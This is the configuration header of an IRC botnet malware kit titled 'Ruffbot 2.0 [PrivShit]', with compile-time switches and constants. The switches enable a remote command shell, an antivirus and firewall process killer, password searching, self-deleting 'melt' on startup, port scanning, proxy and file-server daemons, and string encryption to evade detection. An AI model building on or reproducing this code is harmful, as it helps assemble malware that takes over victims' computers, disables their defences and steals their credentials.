/*
XXXXXXXXXXXXXX   XXXXX      XXXXX  XXXXXXXXXXXXX   XXXXXXXXXXXXX  
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXXXXX  XXXXXXXXXXXXXX 
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXXXX   XXXXXXXXXXXXX  
XXXX       XXXX  XXXXX      XXXXX  XXXXX           XXXXX            
XXXX       XXXX  XXXXX      XXXXX  XXXXX           XXXXX            
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXX     XXXXXXXXXXX     
XXXXXXXXXXXXXX   XXXXX      XXXXX  XXXXXXXXXXXX    XXXXXXXXXXXX     
XXXXXXXXX        XXXXX      XXXXX  XXXXXXXXXXX     XXXXXXXXXXX    
XXXX XXXXX       XXXXX      XXXXX  XXXXX           XXXXX           
XXXX  XXXXX      XXXXX      XXXXX  XXXXX           XXXXX           
XXXX   XXXXX     XXXXX      XXXXX  XXXXX           XXXXX           
XXXX    XXXXX    XXXXXX    XXXXXX  XXXXX           XXXXX           
XXXX     XXXXX   XXXXXXXXXXXXXXXX  XXXXX           XXXXX           
XXXX      XXXXX   XXXXXXXXXXXXXX   XXXXX           XXXXX           
XXXX       XXXXX   XXXXXXXXXXXX    XXXXX           XXXXX 
     



        Ruffbot 2.0 [PrivShit] by Ruffnes

*/ 


 #define NO_IDENT       // disables Ident server
 #define DEBUG_CRYPT    // enables bot string dump in order to try to debug the Crypt() function
// #define NO_CRYPT       // disables Crypted Strings (disabled when using DUMP_ENCRYPT)
 #define NO_REALNICK    // disables Real nick function
// #define NO_NETINFO     // disables Network info function
// #define NO_SYSINFO     // disables System info function
// #define NO_DCC         // disables DCC Chat/Send/Get functions
// #define NO_REMOTECMD   // disables Remote Command Shell function
// #define NO_PROCESS     // disables Process control (ps/kill) functions
// #define NO_DOWNLOAD    // disables Downloading/updating functions
// #define NO_VISIT       // disables Visiting URLs
// #define NO_CONNCHECK   // disables Check for internet connection
// #define NO_BOTVERSION  // disables Bot version
// #define NO_SCAN        // disables Port scanner
// #define NO_SECURE      // disables Secure
// #define NO_SOCK4SERV   // disables SOCKS4 daemon functions
// #define NO_RLOGIN      // disables RLOGIN daemon functions
// #define NO_HTTP        // disables HTTP daemon functions
// #define NO_TFTP        // disables TFTP daemon functions
// #define NO_FTPD        // disables FTP daemon functions
// #define NO_WILDCARD    // disables Wildcard authost
// #define NO_FINDPASS    // disables Find Password function // FIX ME: Not finished yet.
// #define NO_FINDFILE    // disables File search function
// #define NO_EHANDLER    // disables Exception Handler function
// #define NO_CRASH       // disables Crash function
// #define NO_MIRCNICK    // disables mIRC nick prefix
// #define NO_MODEONCONN  // disables setting user modes on-connect
// #define NO_NET         // disables Net Share/Service control functions
// #define NO_AVFW_KILL   // disables Anti-Virus & Firewall process killer
// #define NO_REGISTRY    // disables Registry Monitor on startup function
// #define NO_SECSYSTEM   // disables System Secure Monitor on startup function
// #define NO_MELT        // disables file melt (delete) on start-up
// #define DUMP_ENCRYPT   // enables encrypted string dump (enable for setup only!!)
// #define DEBUG_LOGGING  // enables protocol dumping to a log file for testing purposes
// #define DEBUG_CONSOLE  // enables debugging console for stdout/stderr for testing purposes

#ifdef DUMP_ENCRYPT
#define NO_CRYPT
#endif

#define IRCLINE			512
#define MAXTHREADS		500
#define MAXALIASES		16
#define LOGSIZE			128
#define LOGLINE			128
#define MAXLOGINS		1
#define MAX_LINES		500
#define MAXSCANTHRD		400
#define MAXSCANTIME		9999
#define MAXHOSTNAME		255
#define BLOCKSIZE		512
#define FLOOD_DELAY		1800
#define MAXSTRLEN		500
#define MAXNICKLEN		28
#define MAXPINGSIZE		65500
#define MAXTOKENS		32

#define AMPM(x) ((x>12)?("PM"):("AM"))
#define HOUR(x) ((x>12)?(x-12):(x))

#define fFD_ISSET(fd, set) __fWSAFDIsSet((SOCKET)(fd), (fd_set FAR *)(set))

#define addpredefinedaliases()
